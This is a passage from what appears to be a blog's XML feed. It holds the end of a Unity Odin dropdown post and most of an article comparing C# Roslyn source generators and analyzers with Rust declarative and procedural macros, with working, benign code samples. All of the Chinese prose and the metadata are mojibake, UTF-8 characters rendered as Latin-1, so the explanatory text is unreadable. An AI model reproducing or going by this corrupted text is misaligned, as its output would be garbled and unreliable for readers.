class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ä¿®æ”¹å­—æ®µçš„ç‰¹æ€§</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">CustomValueDropdown(nameof(GetAllowIndexs), nameof(HandleItem))</span>]</span><br></pre></td></tr></table></figure><p><img src="/%E5%9F%BA%E4%BA%8EValueDropdown%E6%8B%93%E5%B1%95%E4%BB%A5%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89icon/image-20250513231709716.png" alt="image-20250513231709716"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity </tag>
            
            <tag> CSharp </tag>
            
            <tag> Odin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆCSharpä¸Rustçš„å…ƒç¼–ç¨‹æœºåˆ¶</title>
      <link href="/%E6%B5%85%E8%B0%88CSharp%E4%B8%8ERust%E7%9A%84%E5%85%83%E7%BC%96%E7%A8%8B%E6%9C%BA%E5%88%B6/"/>
      <url>/%E6%B5%85%E8%B0%88CSharp%E4%B8%8ERust%E7%9A%84%E5%85%83%E7%BC%96%E7%A8%8B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>å¤§éƒ¨åˆ†çš„è¯­è¨€æˆ–å¤šæˆ–å°‘æä¾›äº†ä¸€äº›å…ƒç¼–ç¨‹æœºåˆ¶ï¼Œä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿå¯¹ç°æœ‰çš„è¯­æ³•è¯­ä¹‰è¿›è¡Œæ‹“å±•ï¼Œèƒ½å¤Ÿæå¤§çš„æé«˜ç¼–ç¨‹ä½“éªŒå’Œå¼€å‘æ•ˆç‡ã€‚å¯èƒ½ä¸€æåˆ°å…ƒç¼–ç¨‹ï¼Œå¤§å®¶å¾ˆå®¹æ˜“æƒ³åˆ°å¤§åé¼é¼çš„ <code>Lisp</code> è¯­è¨€ï¼ˆä½ å¯èƒ½ä¼šè¯´ï¼šâ€œéš¾é“ä¸æ˜¯ Cppï¼Ÿâ€ï¼Œæˆ‘åˆä¸ä¼šæ¨¡æ¿å…ƒç¼–ç¨‹ï¼Œä½ è®©æˆ‘è®²å•¥ xï¼‰ã€‚å¾—ç›Šäºå…¶æœ¬èº«æ¥è¿‘è¯­æ³•æ ‘çš„è¯­æ³•ï¼Œä½¿å¾— Lisp å¼€å‘è€…å¯ä»¥å¾ˆå®¹æ˜“æ“ä½œè¯­æ³•èŠ‚ç‚¹ï¼Œç”šè‡³å®ç° â€œè‡ªå·±çš„ Lispâ€ï¼Œäºæ˜¯å°±æ‰æ¶Œç°äº†å¾ˆå¤šçš„ Lisp æ–¹è¨€ã€‚å½“ç„¶ï¼Œæœ¬ç¯‡æ–‡ç« å¹¶ä¸æ˜¯ä¸ºäº†è®¨è®º Lispï¼Œåªæ˜¯æƒ³è¦å°± â€œå…ƒç¼–ç¨‹â€ è¿™ä¸€ä¸ªè§’åº¦ï¼Œæ¥è°ˆè°ˆ C# å’Œ Rust è¯­è¨€å„è‡ªçš„æœºåˆ¶ã€‚</p><blockquote><p>  å…³äº<strong>å…ƒç¼–ç¨‹</strong>æ˜¯ä»€ä¹ˆï¼Œç®€å•æ¥è¯´æ˜¯ç”¨<strong>ç¨‹åºç¼–å†™ç¨‹åº</strong></p><p>  æ›´è¯¦ç»†çš„æè¿°å»ºè®®å‚è€ƒ wiki ï¼š <a href="https://zh.wikipedia.org/wiki/%E5%85%83%E7%BC%96%E7%A8%8B">https://zh.wikipedia.org/wiki/%E5%85%83%E7%BC%96%E7%A8%8B</a></p></blockquote><span id="more"></span><h2 id="å…ƒç¼–ç¨‹æ¦‚è¿°"><a href="#å…ƒç¼–ç¨‹æ¦‚è¿°" class="headerlink" title="å…ƒç¼–ç¨‹æ¦‚è¿°"></a>å…ƒç¼–ç¨‹æ¦‚è¿°</h2><p>å…ƒç¼–ç¨‹ä¸€èˆ¬æœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼šä¸€æ˜¯é€šè¿‡ä½¿ç”¨å†…éƒ¨æš´éœ²çš„ API æ¥ç›´æ¥å¤„ç†è¯­æ³•èŠ‚ç‚¹ï¼ŒäºŒæ˜¯èƒ½å¤ŸåŠ¨æ€æ‰§è¡Œå­—ç¬¦ä¸²è¡¨è¾¾å¼ã€‚</p><p>å¯¹äºåè€…æ¥è¯´ï¼Œå…¸å‹çš„æ˜¯ Python çš„ <code>eval</code>  å’Œ <code>exec</code> å‡½æ•°ï¼ŒJS ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„åŠŸèƒ½ã€‚å¯¹äºè¿™ç±»å®ç°æ¥è¯´ï¼Œå›ºç„¶ååˆ†æ–¹ä¾¿ï¼Œä½†æ˜¯ä¹Ÿä¼šå¸¦æ¥å¾ˆä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚å¦‚æœå¯¹äºå¤–éƒ¨ç”¨æˆ·æ¥è¯´ï¼Œ<code>eval</code> è¿™ç±»çš„å±é™©å‡½æ•°çš„è¾“å…¥æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥ä¼ å…¥ä¸€æ®µç²¾å¿ƒæ„é€ çš„å­—ç¬¦ä¸²æ¥æ‰§è¡Œæ¶æ„å‘½ä»¤å¯¼è‡´å¯èƒ½çš„ä¿¡æ¯æ³„éœ²ã€ææƒç­‰å®‰å…¨é—®é¢˜ã€‚</p><p>æ‰€ä»¥æˆ‘ä¸ªäººä¼šæ›´å€¾å‘äºå‰è€…ï¼ˆè™½ç„¶è¿™å¾€å¾€æ„å‘³ç€æ›´åŠ æŠ½è±¡çš„è¯­æ³•å’Œæ›´é«˜çš„ç¼–å†™éš¾åº¦ï¼‰ï¼Œæ¯”å¦‚ C# å’Œ Rust ä¾¿æ˜¯å¦‚æ­¤ã€‚</p><p>åœ¨ C# ä¸­ï¼ŒRoslyn ç¼–è¯‘å™¨æä¾›äº†ä¸€ç³»åˆ— API ï¼ˆ<code>Microsoft.CodeAnalysis.CSharp</code>ï¼‰ç”¨äºç¼–å†™æºç”Ÿæˆå™¨ï¼Œæºç”Ÿæˆå™¨ä¼šåœ¨ç¼–è¯‘æ—¶è¢«è°ƒç”¨ï¼Œè®¿é—®æ¯ä¸ªè¯­æ³•èŠ‚ç‚¹ï¼Œç„¶åæ ¹æ®ä½ çš„å®ç°å»åŠ¨æ€çš„ç”Ÿæˆä»£ç ç»™ç¼–è¯‘å™¨ï¼ˆå¦‚æœä¸å¼€ emitï¼Œé‚£ä¹ˆè¿™äº›ä»£ç ä¸ä¼šä»¥å®é™…çš„æºæ–‡ä»¶å½¢å¼å‡ºç°åœ¨ä½ çš„æ–‡ä»¶å¤¹ä¸­ï¼‰ï¼›è€Œ Rust åˆ™æ˜¯æä¾›äº†æå…¶å¼ºå¤§ï¼Œå ªæ¯” Lisp çš„å®ç³»ç»Ÿã€‚æ™®é€šçš„å‡½æ•°å®ä¼šä¾æ®ç”¨æˆ·ç¼–å†™çš„è§„åˆ™å»åœ¨ç¼–è¯‘æœŸå±•å¼€ï¼Œè¿‡ç¨‹å®åˆ™æœ‰ç‚¹æ¥è¿‘ C#ï¼Œä¸è¿‡ Rust å¹¶ä¸æä¾›ç›´æ¥éå†å…¨å±€çš„è¯­æ³•èŠ‚ç‚¹ï¼Œè€Œåªæ˜¯é™åˆ¶åœ¨è¯¥å®çš„ä½¿ç”¨è€…æœ¬èº«ã€‚</p><h2 id="ä¸€äº›ç®€å•å®è·µ"><a href="#ä¸€äº›ç®€å•å®è·µ" class="headerlink" title="ä¸€äº›ç®€å•å®è·µ"></a>ä¸€äº›ç®€å•å®è·µ</h2><p>ä»¥ä¸‹æ˜¯å…³äº C# å’Œ Rust å…ƒç¼–ç¨‹çš„ç®€å•å®è·µï¼Œå¯ä»¥è§‚å¯Ÿä¸€ä¸‹ä»–ä»¬ä¹‹é—´çš„å·®å¼‚ã€‚</p><blockquote><p>  ä»¥ä¸‹ä»£ç å¹¶éæ˜¯ä¸ºäº†æ•™å­¦ï¼Œåªæ˜¯ä»ä¸€äº›ç®€å•çš„ç¤ºä¾‹æ¥æ¯”è¾ƒä»–ä»¬ä¹‹é—´çš„å·®å¼‚æ€§ï¼Œä»¥åŠè®¨è®ºå„è‡ªçš„ä¼˜åŠ£ã€‚</p><p>  å…³äºä»£ç çš„è§£é‡Šï¼Œä¼šåœ¨åé¢ä¸€èµ·åˆ†æ</p></blockquote><h3 id="C-å¢é‡ç”Ÿæˆå™¨ï¼ˆIncrementalGeneratorï¼‰å®è·µ"><a href="#C-å¢é‡ç”Ÿæˆå™¨ï¼ˆIncrementalGeneratorï¼‰å®è·µ" class="headerlink" title="C# å¢é‡ç”Ÿæˆå™¨ï¼ˆIncrementalGeneratorï¼‰å®è·µ"></a>C# å¢é‡ç”Ÿæˆå™¨ï¼ˆIncrementalGeneratorï¼‰å®è·µ</h3><blockquote><p>  ç”±äº C# çš„<strong>æºç”Ÿæˆå™¨</strong>æ¯æ¬¡éƒ½è¦éå†æ‰€æœ‰è¯­æ³•èŠ‚ç‚¹ï¼Œååˆ†å½±å“æ€§èƒ½ï¼Œå¾®è½¯å·²ç»å°†å…¶æ ‡è®°ä¸º<strong>å¼ƒç”¨</strong>ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯æ–°çš„å¢é‡ç”Ÿæˆå™¨ API</p><p>  <strong>å¢é‡ç”Ÿæˆå™¨</strong>ä¸­æä¾›äº†å¤šç§ç®¡é“è¿›è¡Œåˆ†æï¼Œæ¯”å¦‚ <code>CompilationProvider</code> , <code>SyntaxProvider</code>, <code>AdditionalTextsProvider</code> ç­‰ç­‰ã€‚ç›¸æ¯”äºæ—§çš„ <code>ISourceGenerator</code> ï¼Œå¯ä»¥æä¾›æ›´ç»†ç²’åº¦çš„åˆ†æï¼Œæ¥å—çš„åˆ†æå¯¹è±¡ä¹Ÿä¸å±€é™äºæºä»£ç ã€‚</p></blockquote><p>é¦–å…ˆéœ€è¦æ–°å»ºä¸€ä¸ª C# åº“é¡¹ç›®ï¼Œæˆ‘æ¨èç›®æ ‡æ¡†æ¶æ˜¯ netstandard2.0ï¼Œä½¿ç”¨çš„ <code>Microsoft.CodeAnalysis.CSharp</code> ç‰ˆæœ¬ä¸º <code>4.3.0</code> ï¼ˆè¿™å¯ä»¥ä¿è¯è¯¥æºç”Ÿæˆå™¨èƒ½åœ¨å¤§éƒ¨åˆ†çš„é¡¹ç›®ä¸­ä½¿ç”¨ï¼Œç”šè‡³ Unityï¼‰</p><p>ç®€å•å†™ä¸€ä¸ªå° demoï¼š</p><p>å¯¹äºè¯¥ç”Ÿæˆå™¨ï¼Œéœ€è¦å®ç° <code>IIncrementalGenerator</code>  æ¥å£çš„ <code>Initialize</code> æ–¹æ³•ã€‚ç„¶åæˆ‘ä»¬ä»è¯­æ³•èŠ‚ç‚¹çš„è§’åº¦åˆ‡å…¥ï¼Œæ¯”å¦‚æˆ‘ä»¬éœ€è¦ç»™å…·æœ‰ <code>[Test]</code> Attribute çš„ class åˆ†éƒ¨å®ç°ä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥åƒä¸‹é¢è¿™æ ·ã€‚</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis.CSharp.Syntax;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test.Analysis</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Generator(LanguageNames.CSharp)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">TestGenerator</span> : <span class="title">IIncrementalGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Initialize</span>(<span class="params">IncrementalGeneratorInitializationContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> provider = context.SyntaxProvider</span><br><span class="line">                .CreateSyntaxProvider(</span><br><span class="line">                    (s, _) =&gt; s <span class="keyword">is</span> ClassDeclarationSyntax classDecl &amp;&amp; </span><br><span class="line">                        classDecl.AttributeLists</span><br><span class="line">                            .SelectMany(al =&gt; al.Attributes)</span><br><span class="line">                            .Any(a =&gt; a.Name.ToString() == <span class="string">&quot;Test&quot;</span>),</span><br><span class="line">                    (ctx, _) =&gt; ctx.Node <span class="keyword">as</span> ClassDeclarationSyntax</span><br><span class="line">                ).Collect();</span><br><span class="line"></span><br><span class="line">            context.RegisterSourceOutput(provider, (spc, source) =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">var</span> @class <span class="keyword">in</span> source)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">var</span> namespaceName = @class.FirstAncestorOrSelf&lt;NamespaceDeclarationSyntax&gt;().Name.ToString();</span><br><span class="line">                    <span class="comment">// Add Test method to the class</span></span><br><span class="line">                    <span class="keyword">var</span> code = <span class="string">$@&quot;// &lt;auto-generated/&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace <span class="subst">&#123;namespaceName&#125;</span></span></span><br><span class="line"><span class="string">&#123;&#123;</span></span><br><span class="line"><span class="string">    public partial class <span class="subst">&#123;@<span class="keyword">class</span>.Identifier&#125;</span></span></span><br><span class="line"><span class="string">    &#123;&#123;</span></span><br><span class="line"><span class="string">        public void Test() =&gt; Console.WriteLine(&quot;&quot;Test&quot;&quot;);</span></span><br><span class="line"><span class="string">    &#125;&#125;</span></span><br><span class="line"><span class="string">&#125;&#125;&quot;</span>;</span><br><span class="line">                    spc.AddSource(<span class="string">$&quot;<span class="subst">&#123;@<span class="keyword">class</span>.Identifier&#125;</span>_Test.g.cs&quot;</span>, SourceText.From(code, Encoding.UTF8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–åœ¨ä¸€ä¸ªç»ˆç«¯é¡¹ç›®ä¸­å¼•ç”¨è¯¥é¡¹ç›®ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ª TestAttributeï¼Œç„¶ååœ¨ä¸€ä¸ªåˆ†éƒ¨ç±»ä¸Šä½¿ç”¨å®ƒï¼Œç„¶åè¿™ä¸ªç±»å°±ä¼šè‡ªåŠ¨å®ç° Test() æ–¹æ³•äº†ã€‚</p><blockquote><p>  è¯´æ˜:information_source: ï¼š ç”±äºæµ‹è¯•é¡¹ç›®ä½¿ç”¨çš„æ˜¯ net9.0ï¼Œ æ”¯æŒé¡¶çº§è¡¨è¾¾å¼ï¼Œæ‰€ä»¥å¯ä»¥ä¸éœ€è¦å†™é™æ€ Main å‡½æ•°ã€‚</p></blockquote><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> Test.TestClass();</span><br><span class="line">test.Test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">TestClass</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">AttributeUsage(AttributeTargets.Class, AllowMultiple = true, Inherited = true)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TestAttribute</span> : <span class="title">Attribute</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹å°±ä¼šå‘ç°æ­£ç¡®è¾“å‡ºäº† <code>&quot;Test&quot;</code></p><h3 id="C-è¯Šæ–­åˆ†æå™¨ï¼ˆDiagnosticAnalyzerï¼‰å®è·µ"><a href="#C-è¯Šæ–­åˆ†æå™¨ï¼ˆDiagnosticAnalyzerï¼‰å®è·µ" class="headerlink" title="C# è¯Šæ–­åˆ†æå™¨ï¼ˆDiagnosticAnalyzerï¼‰å®è·µ"></a>C# è¯Šæ–­åˆ†æå™¨ï¼ˆDiagnosticAnalyzerï¼‰å®è·µ</h3><p>æ¯”å¦‚æˆ‘å¸Œæœ› <code>[Test]</code> æ‰€åœ¨çš„ class æ˜¯å¯†å°çš„ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥åˆ›å»ºä¸€ä¸ªè¯Šæ–­å™¨æ¥åˆ†æï¼Œå½“ä¸æ˜¯ sealed æ—¶æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span> disable RS2008</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Collections.Immutable;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis.CSharp;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis.CSharp.Syntax;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test.Analysis</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DiagnosticAnalyzer(LanguageNames.CSharp)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">TestAnalyzer</span> : <span class="title">DiagnosticAnalyzer</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">override</span> ImmutableArray&lt;DiagnosticDescriptor&gt; SupportedDiagnostics =&gt; ImmutableArray.Create(Rule);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> DiagnosticDescriptor Rule = <span class="keyword">new</span> DiagnosticDescriptor(</span><br><span class="line">            id: <span class="string">&quot;TEST001&quot;</span>,</span><br><span class="line">            title: <span class="string">&quot;Test class must be sealed&quot;</span>,</span><br><span class="line">            messageFormat: <span class="string">&quot;class &#x27;&#123;0&#125;&#x27; must be sealed&quot;</span>,</span><br><span class="line">            category: <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">            defaultSeverity: DiagnosticSeverity.Error,</span><br><span class="line">            isEnabledByDefault: <span class="literal">true</span>,</span><br><span class="line">            description: <span class="string">&quot;Test class must be sealed.&quot;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Initialize</span>(<span class="params">AnalysisContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.ConfigureGeneratedCodeAnalysis(GeneratedCodeAnalysisFlags.Analyze | GeneratedCodeAnalysisFlags.ReportDiagnostics);</span><br><span class="line">            context.EnableConcurrentExecution();</span><br><span class="line">            context.RegisterSyntaxNodeAction(AnalyzeSyntax, SyntaxKind.ClassDeclaration);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AnalyzeSyntax</span>(<span class="params">SyntaxNodeAnalysisContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (context.Node <span class="keyword">is</span> <span class="keyword">not</span> ClassDeclarationSyntax classDecl) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> hasTestAttribute = classDecl.AttributeLists</span><br><span class="line">                .SelectMany(al =&gt; al.Attributes)</span><br><span class="line">                .Any(a =&gt; a.Name.ToString() == <span class="string">&quot;Test&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (hasTestAttribute == <span class="literal">false</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> isSealed = classDecl.Modifiers.Any(m =&gt; m.IsKind(SyntaxKind.SealedKeyword));</span><br><span class="line">            <span class="keyword">if</span> (isSealed == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                context.ReportDiagnostic(Diagnostic.Create(SupportedDiagnostics[<span class="number">0</span>], classDecl.GetLocation(), classDecl.Identifier.Text));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå›åˆ°æµ‹è¯•é¡¹ç›®å°è¯• buildï¼Œå°±å¯ä»¥çœ‹åˆ°æœ‰æ¡æŠ¥é”™ï¼š<code>error TEST001: class &#39;TestClass&#39; must be sealed</code></p><h3 id="Rust-å‡½æ•°å®ï¼ˆå£°æ˜å®ï¼‰å®è·µ"><a href="#Rust-å‡½æ•°å®ï¼ˆå£°æ˜å®ï¼‰å®è·µ" class="headerlink" title="Rust å‡½æ•°å®ï¼ˆå£°æ˜å®ï¼‰å®è·µ"></a>Rust å‡½æ•°å®ï¼ˆå£°æ˜å®ï¼‰å®è·µ</h3><blockquote><p>  æˆ‘ä½¿ç”¨çš„æ˜¯æ–°çš„å®å£°æ˜æ–¹å¼ï¼Œæ—§çš„æ–¹å¼æ˜¯ä½¿ç”¨ <code>macro_rules!</code> è¿›è¡Œå£°æ˜</p><p>  <code>#![feature(decl_macro)]</code> éœ€è¦ä½¿ç”¨ Rust çš„ nightly æˆ– beta ç‰ˆæœ¬ :warning:</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![feature(decl_macro)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    macros::hello!(world);</span><br><span class="line">    macros::muti_hello!(world, rust, <span class="keyword">macro</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> macros &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">macro</span> <span class="title function_ invoke__">hello</span>($n:ident) &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Hello, &#123;&#125;!&quot;</span>, <span class="built_in">stringify!</span>($n));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">macro</span> <span class="title function_ invoke__">muti_hello</span>($( $n:ident ),*$(,)?) &#123;</span><br><span class="line">        $(</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;Hello, &#123;&#125;!&quot;</span>, <span class="built_in">stringify!</span>($n));</span><br><span class="line">        )*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹è§‚å¯Ÿè¾“å‡ºï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Hello,</span> world!</span><br><span class="line"><span class="built_in">Hello,</span> world!</span><br><span class="line"><span class="built_in">Hello,</span> rust!</span><br><span class="line"><span class="built_in">Hello,</span> macro!</span><br></pre></td></tr></table></figure><h3 id="Rust-è¿‡ç¨‹å®ï¼ˆproc-macroï¼‰å®è·µ"><a href="#Rust-è¿‡ç¨‹å®ï¼ˆproc-macroï¼‰å®è·µ" class="headerlink" title="Rust è¿‡ç¨‹å®ï¼ˆproc-macroï¼‰å®è·µ"></a>Rust è¿‡ç¨‹å®ï¼ˆproc-macroï¼‰å®è·µ</h3><p>Rust å†™è¿‡ç¨‹å®ç±»ä¼¼äº C# çš„å¢é‡ç”Ÿæˆå™¨æˆ–è¯Šæ–­å™¨ï¼Œä¹Ÿæ˜¯éœ€è¦æ–°å»ºä¸€ä¸ª Rust é¡¹ç›®ï¼Œåœ¨æ–°çš„è¿‡ç¨‹å®é¡¹ç›®ä¸­æ·»åŠ  quote, syn ä¾èµ–ï¼Œç„¶åç®€å•å†™ä¸€ä¸ª Hello ç‰¹å¾çš„ derive</p><blockquote><p>  Rust trait ï¼ˆç‰¹å¾ï¼‰ å¯ä»¥ç±»æ¯”äºå…¶ä»–è¯­è¨€çš„ interfaceï¼ˆæ¥å£ï¼‰</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> proc_macro;</span><br><span class="line"><span class="keyword">use</span> proc_macro::TokenStream;</span><br><span class="line"><span class="keyword">use</span> quote::quote;</span><br><span class="line"><span class="keyword">use</span> syn::&#123;parse::Parse, parse_macro_input, DeriveInput, Token&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[proc_macro_derive(Hello)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">hello_derive</span>(input: TokenStream) <span 